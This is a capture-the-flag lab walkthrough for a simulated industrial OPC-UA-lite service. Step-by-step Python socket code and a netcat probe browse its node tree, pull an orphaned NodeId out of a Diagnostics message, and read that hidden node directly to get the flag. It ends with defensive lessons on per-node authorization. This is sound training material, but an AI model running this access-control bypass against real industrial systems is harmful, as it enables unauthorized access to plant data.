# Challenge 3 — OPC Scout

**Protocol:** Custom OPC-UA-lite binary protocol  
**Target:** `10.0.1.1:9005`  
**Toolkit module:** None  
**Focus:** Service identification, binary protocol analysis, node browsing, and orphaned-node discovery

---

## The Story

After a plant reconfiguration, a node was unlinked from the visible Objects tree but remained readable. The monitoring server's Diagnostics node still references its NodeId.

Your task is to browse the service, inspect Diagnostics, recover the orphaned NodeId, and read that node directly.

## What You Know

- The server identifies itself as `Sysrupt-OPCUA/1.0`.
- The target is `10.0.1.1:9005`.
- This is **not** a standards-compliant OPC UA server. It uses an in-house OPC-UA-lite protocol.
- The expected browse path is `Root → Server → Diagnostics`.
- A normal OPC UA client may fail its handshake; use the custom framing described below.

## Step 1: Check the Service

<details>
<summary>Hint</summary>

Start by checking whether the TCP port is reachable. A successful connection only proves that something is listening; it does not identify the application protocol.

</details>

<details>
<summary>Show command</summary>

```bash
nc -vz 10.0.1.1 9005
```

</details>

## Step 2: Send HELLO

<details>
<summary>Hint</summary>

The lightweight service expects a one-byte initial request. Capture the reply as raw bytes rather than assuming it is text.

</details>

<details>
<summary>Show command</summary>

```python
import socket

HOST, PORT = "10.0.1.1", 9005

with socket.create_connection((HOST, PORT), timeout=5) as sock:
    sock.settimeout(3)
    sock.sendall(b"\x01")
    print("HELLO:", repr(sock.recv(64)))
```

</details>

## Step 3: Understand the Request Format

<details>
<summary>Hint</summary>

The provided client uses a one-byte operation followed by a two-byte NodeId in big-endian order. The operation byte distinguishes browsing from reading.

</details>

<details>
<summary>Show command</summary>

```python
def browse(sock, node_id):
    sock.sendall(bytes([
        0x02,
        (node_id >> 8) & 0xff,
        node_id & 0xff
    ]))
    return sock.recv(1024)

def read(sock, node_id):
    sock.sendall(bytes([
        0x03,
        (node_id >> 8) & 0xff,
        node_id & 0xff
    ]))
    return sock.recv(1024)

# Example: browse Root, NodeId 0x0000
# Request bytes: 02 00 00
```

</details>

## Step 4: Browse Root and Find Server

<details>
<summary>Hint</summary>

Begin at NodeId `0x0000`. A BROWSE response begins with `0x82`, then a status byte and a child count. Each child entry contains a two-byte NodeId, a one-byte name length, and that many UTF-8 bytes.

</details>

<details>
<summary>Show command</summary>

```python
def decode_browse(response):
    if len(response) < 3 or response[0] != 0x82:
        raise ValueError(f"Unexpected BROWSE response: {response!r}")

    status, count = response[1], response[2]
    children = []
    offset = 3

    for _ in range(count):
        if offset + 3 > len(response):
            raise ValueError("Truncated BROWSE entry")

        node_id = (response[offset] << 8) | response[offset + 1]
        name_len = response[offset + 2]
        offset += 3

        if offset + name_len > len(response):
            raise ValueError("Truncated node name")

        name = response[offset:offset + name_len].decode(
            "utf-8", "replace"
        )
        children.append((node_id, name))
        offset += name_len

    return status, children

root_status, root_children = decode_browse(browse(sock, 0x0000))
print("ROOT status:", root_status)
print("ROOT children:", root_children)

server_id = next(nid for nid, name in root_children if name == "Server")
server_status, server_children = decode_browse(browse(sock, server_id))
print("SERVER children:", server_children)
```

Run the requests on the same connected socket, after sending HELLO. The `sock` variable must still be in scope.

</details>

## Step 5: Read Diagnostics

<details>
<summary>Hint</summary>

Find the `Diagnostics` child under `Server`. A READ response begins with `0x83`, followed by a status byte, a one-byte value length, and the value.

</details>

<details>
<summary>Show command</summary>

```python
def decode_read(response):
    if len(response) < 3 or response[0] != 0x83:
        raise ValueError(f"Unexpected READ response: {response!r}")

    status, length = response[1], response[2]
    value = response[3:3 + length]

    if len(value) != length:
        raise ValueError("Truncated READ response")

    return status, value

diag_id = next(
    nid for nid, name in server_children if name == "Diagnostics"
)
diag_status, diag_value = decode_read(read(sock, diag_id))
diag_text = diag_value.decode("utf-8", "replace")

print("DIAGNOSTICS status:", diag_status)
print("DIAGNOSTICS:", diag_text)
```

</details>

## Step 6: Extract the Orphaned NodeId

<details>
<summary>Hint</summary>

Look for a diagnostic string containing a value such as `i=0x5000`. The number is only an example: use the identifier reported by your own target.

</details>

<details>
<summary>Show command</summary>

```python
import re

match = re.search(r"i=0x([0-9a-fA-F]+)", diag_text)
if not match:
    raise RuntimeError("Could not find orphaned NodeId in diagnostics")

orphan_id = int(match.group(1), 16)
print(f"Orphaned NodeId: 0x{orphan_id:04x}")
```

</details>

## Step 7: Read the Orphaned Node

<details>
<summary>Hint</summary>

The key is that the node is no longer linked into the browsable tree, but its NodeId may still be accepted by a direct READ request.

</details>

<details>
<summary>Show command</summary>

```python
flag_status, flag_value = decode_read(read(sock, orphan_id))
print("READ status:", flag_status)
print("VALUE:", flag_value.decode("utf-8", "replace"))
```

</details>

## Troubleshooting

- **Standard OPC UA client fails:** expected; this service uses custom framing rather than the standard OPC UA handshake.
- **Unexpected response marker:** inspect the raw bytes and confirm that the previous request was sent on the same socket.
- **Truncated response:** TCP does not preserve application message boundaries. A single `recv()` is not guaranteed to return a complete frame; implement buffered reads if responses arrive in fragments.
- **No `Diagnostics` child:** print the returned child list and verify that you are browsing the `Server` node.
- **No NodeId in Diagnostics:** print the full decoded diagnostic value before changing the extraction pattern.
- **Nonzero status:** do not assume the operation succeeded just because the response decoded; interpret the status according to the challenge protocol.

## What You Learned

- An unlinked node may remain accessible if the server does not enforce access control independently of the browse tree.
- Diagnostic messages can disclose internal node identifiers.
- A service name does not guarantee standards compliance; inspect the actual protocol.
- Binary clients should validate message types, lengths, and status codes.

## Defensive Takeaways

- Enforce authorization on every node read and browse operation.
- Remove stale references during configuration changes.
- Avoid exposing internal identifiers in diagnostic messages.
- Validate NodeId existence and permissions independently of browse visibility.
- Use robust framing and strict input validation.
